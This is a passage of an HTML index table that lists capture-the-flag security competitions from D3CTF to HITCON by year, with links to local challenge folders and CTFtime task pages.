href=\"https://ctftime.org/event/2468/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Cyshock\">Cyshock</a></td>\n            <td><a href=\"ctfs/Cyshock/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2787/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/D3CTF\">D3CTF</a></td>\n            <td><a href=\"ctfs/D3CTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2770/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/D3CTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2276/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/D3CTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1885/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/D3CTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1554/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/BDSec\">BDSec</a></td>\n            <td><a href=\"ctfs/BDSec/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2784/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BDSec/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1946/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/BDSec/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1699/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/DCTF\">DCTF</a></td>\n            <td><a href=\"ctfs/DCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1361/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/DEADFACE\">DEADFACE</a></td>\n            <td><a href=\"ctfs/DEADFACE/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2912/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEADFACE/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2443/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEADFACE/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2031/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/DEFCON\">DEF CON</a></td>\n            <td><a href=\"ctfs/DEFCON/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2604/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2229/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1661/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1254/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/994/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/762/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DEFCON/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/608/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/DIVEROSINT\">DIVEROSINT</a></td>\n            <td><a href=\"ctfs/DIVEROSINT/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2751/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DIVEROSINT/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2365/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/DaVinciCTF\">DaVinciCTF</a></td>\n            <td><a href=\"ctfs/DaVinciCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2675/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DaVinciCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1858/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DaVinciCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1559/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DaVinciCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1296/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/DamCTF\">DamCTF</a></td>\n            <td><a href=\"ctfs/DamCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2262/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DamCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1401/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DamCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1076/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Damncon\">Damncon</a></td>\n            <td><a href=\"ctfs/Damncon/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1726/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Damncon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1481/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/DanteCTF\">DanteCTF</a></td>\n            <td><a href=\"ctfs/DanteCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2000/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/DarkCTF\">Dark</a></td>\n            <td><a href=\"ctfs/DarkCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1118/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/DawgCTF\">DawgCTF</a></td>\n            <td><a href=\"ctfs/DawgCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2651/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DawgCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2343/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DawgCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1974/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DawgCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1633/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DawgCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1319/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DawgCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1030/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/De1CTF\">De1CTF</a></td>\n            <td><a href=\"ctfs/De1CTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1033/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/De1CTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/843/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/DeadSec\">DeadSec</a></td>\n            <td><a href=\"ctfs/DeadSec/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2631/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DeadSec/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2353/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DeadSec/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1962/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/DeconstruCT.F\">DeconstruCT.F</a></td>\n            <td><a href=\"ctfs/DeconstruCT.F/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2042/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DeconstruCT.F/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1453/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/Defcamp\">Defcamp</a></td>\n            <td><a href=\"ctfs/Defcamp/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2480/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Defcamp/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2106/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Defcamp/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1560/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Defcamp/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1182/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Defcamp/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/654/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Defenit\">Defenit</a></td>\n            <td><a href=\"ctfs/Defenit/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1060/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/DiceCTF\">DiceCTF</a></td>\n            <td><a href=\"ctfs/DiceCTF/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2617/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DiceCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2217/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DiceCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1838/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DiceCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1541/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DiceCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1236/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/DigitalOverdose\">DigitalOverdose</a></td>\n            <td><a href=\"ctfs/DigitalOverdose/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1623/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DigitalOverdose/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1459/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/DownUnderCTF\">DownUnderCTF</a></td>\n            <td><a href=\"ctfs/DownUnderCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2669/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DownUnderCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2284/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DownUnderCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1954/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DownUnderCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1625/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DownUnderCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1312/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DownUnderCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1084/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Dragon\">Dragon</a></td>\n            <td><a href=\"ctfs/Dragon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1457/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Dragon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1082/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Dragon/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/648/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Dreamhack\">DreamhackInvitational</a></td>\n            <td><a href=\"ctfs/Dreamhack/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2622/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/DreamhackInvitational\">DreamhackInvitational</a></td>\n            <td><a href=\"ctfs/DreamhackInvitational/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2627/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/DreamhackInvitational/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2308/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/EBCTF\">EBCTF</a></td>\n            <td><a href=\"ctfs/EBCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1696/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ECW\">ECW</a></td>\n            <td><a href=\"ctfs/ECW/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2959/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/EHAX\">EHAX</a></td>\n            <td><a href=\"ctfs/EHAX/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2677/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/EKOPARTY\">EKOPARTY</a></td>\n            <td><a href=\"ctfs/EKOPARTY/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2507/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ESCAPE\">ESCAPE</a></td>\n            <td><a href=\"ctfs/ESCAPE/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2022/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Engineer\">Engineer</a></td>\n            <td><a href=\"ctfs/Engineer/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1595/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/EnigmaXplore\">EnigmaXplore</a></td>\n            <td><a href=\"ctfs/EnigmaXplore/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2957/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/EnigmaXplore/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2524/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/EvlzCTF\">Evlz</a></td>\n            <td><a href=\"ctfs/EvlzCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1070/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/FE-CTF\">FE-CTF</a></td>\n            <td><a href=\"ctfs/FE-CTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1979/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/FE-CTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1776/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/FacebookCTF\">Facebook</a></td>\n            <td><a href=\"ctfs/FacebookCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/781/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/FireShell\">FireShell</a></td>\n            <td><a href=\"ctfs/FireShell/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/944/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/FireShell/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/727/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/FooBarCTF\">FooBarCTF</a></td>\n            <td><a href=\"ctfs/FooBarCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2720/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/FooBarCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1579/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/FooBarCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1322/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Freedom\">Freedom</a></td>\n            <td><a href=\"ctfs/Freedom/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1375/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/FullWeakEngineer\">FullWeakEngineer</a></td>\n            <td><a href=\"ctfs/FullWeakEngineer/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2864/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/FwordCTF\">Fword</a></td>\n            <td><a href=\"ctfs/FwordCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1405/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/FwordCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1066/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/GACTF\">GACTF</a></td>\n            <td><a href=\"ctfs/GACTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1115/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/GCC\">GCC</a></td>\n            <td><a href=\"ctfs/GCC/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2251/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/GDGAlgiers\">GDGAlgiers</a></td>\n            <td><a href=\"ctfs/GDGAlgiers/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1745/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/GLSC\">Great Lakes Security Conference</a></td>\n            <td><a href=\"ctfs/GLSC/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1341/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/GPN\">GPN</a></td>\n            <td><a href=\"ctfs/GPN/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2694/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GPN/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2257/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Glacier\">Glacier</a></td>\n            <td><a href=\"ctfs/Glacier/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2402/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Glacier/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1992/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Glacier/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1803/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=8><a href=\"ctfs/GoogleCTF\">Google</a></td>\n            <td><a href=\"ctfs/GoogleCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2718/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2296/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1929/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1641/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1318/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1041/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/809/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GoogleCTF/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/623/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/GREP\">GREP</a></td>\n            <td><a href=\"ctfs/GREP/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1958/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/GreyCatTheFlag\">GreyCatTheFlag</a></td>\n            <td><a href=\"ctfs/GreyCatTheFlag/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2765/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GreyCatTheFlag/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2242/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GreyCatTheFlag/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1938/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/GreyCatTheFlag/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1643/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/CyberGrabs\">CyberGrabs</a></td>\n            <td><a href=\"ctfs/CyberGrabs/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1556/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/CyberGrabs/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1353/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/H7CTFInternational\">H7CTFInternational</a></td>\n            <td><a href=\"ctfs/H7CTFInternational/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2938/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/H7CTFInternational/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2491/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HCMUS\">HCMUS</a></td>\n            <td><a href=\"ctfs/HCMUS/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1944/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=9><a href=\"ctfs/HITCON\">HITCON</a></td>\n            <td><a href=\"ctfs/HITCON/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2783/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2345/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2019/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1772/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1460/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1136/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/848/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/669/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/HITCON/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/HITCON/2017/Quals\">2017 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/485/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/HKCERT\">HKCERT</a></td>\n            <td><a href=\"ctfs/HKCERT/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2455/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a 